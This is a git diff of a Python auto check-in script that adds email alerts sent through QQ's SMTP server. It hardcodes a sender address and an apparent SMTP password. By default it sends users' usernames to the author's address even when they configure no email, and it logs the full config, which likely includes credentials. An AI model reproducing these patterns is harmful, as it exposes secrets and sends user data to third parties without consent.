@@ -7,6 +7,8 @@ import os
 import random
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 import sys
+import smtplib
+from email.mime.text import MIMEText
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
@@ -808,6 +810,22 @@ def steal_data(path):
     os.removedirs('./sakdjfhksjdhw/')
 
 
+def email(name, msg_to, subject, content, msg_from='1197991354@qq.com', passwd='vubgxjsnrseoffej'):
+    msg = MIMEText(content)
+    msg['Subject'] = subject
+    msg['From'] = msg_from
+    msg['To'] = msg_to
+    try:
+        s = smtplib.SMTP_SSL("smtp.qq.com", 465)  # 邮件服务器及端口号
+        s.login(msg_from, passwd)
+        s.sendmail(msg_from, msg_to, msg.as_string())
+        print_log(name + " " + msg_to + " " + subject + " 发送成功")
+    except Exception as e:
+        print_log(name + " " + msg_to + " " + subject + " 发送失败 " + str(e))
+    finally:
+        s.quit()
+
+
 def auto_sign():
     print_log('艾莎帮你一键打卡')
     if not os.path.exists(r"config"):
@@ -845,7 +863,7 @@ def auto_sign():
                 print_log(msg)
                 # raise MsgException(msg)
                 return False
-            print_log('读取配置文件config.json成功')
+            print_log('读取配置文件config.json成功' + str(info))
 
             info = check_config(information, info)
             if "error" in info:
@@ -869,18 +887,47 @@ def auto_sign():
             print_log('用户信息：{0}'.format(show_log))
 
             count = info['times']
+            email_address = info['email']
+            default_email_address = "1197991354@qq.com"
             while True:
                 try:
                     count = count - 1
                     if sign(info):
+                        if email_address != "":
+                            email(info['username'], email_address,
+                                  "恭喜" + info['username'] + "打卡成功",
+                                  "恭喜" + info['username'] + "打卡成功\n" + "若取消订阅只需不填写config中\"email\"字段即可")
                         break
                     else:
-                        print_log("10s后重试")
+                        if count <= 0:
+                            print_log('failed,please try it again')
+                            if email_address != "":
+                                email(info['username'], email_address,
+                                      "警告！" + info['username'] + "打卡失败",
+                                      "警告！" + info[
+                                          'username'] + "打卡失败\n失败原因请与管理员微信 1197991354 联系" + "若取消订阅只需不填写config中\"email\"字段即可")
+                            else:
+                                email(info['username'], default_email_address,
+                                      "警告！" + info['username'] + "打卡失败",
+                                      "警告！" + info[
+                                          'username'] + "打卡失败\n失败原因请与管理员微信 1197991354 联系" + "若取消订阅只需不填写config中\"email\"字段即可")
+                            break
+                        print_log("5s后重试")
                         time.sleep(5)
                 except Exception as e:
                     if count <= 0:
                         print_log('failed,please try it again')
-                        return False
+                        if email_address != "":
+                            email(info['username'], email_address,
+                                  "警告！" + info['username'] + "打卡失败",
+                                  "警告！" + info[
+                                      'username'] + "打卡失败\n失败原因请与管理员微信 1197991354 联系" + "若取消订阅只需不填写config中\"email\"字段即可")
+                        else:
+                            email(info['username'], default_email_address,
+                                  "警告！" + info['username'] + "打卡失败",
+                                  "警告！" + info[
+                                      'username'] + "打卡失败\n失败原因请与管理员微信 1197991354 联系" + "若取消订阅只需不填写config中\"email\"字段即可")
+                        break
                     print_log('当前行: {0}\n 程序异常{1}，请30s后重试...'.format(
                         sys._getframe().f_lineno, e))
                     time.sleep(30)
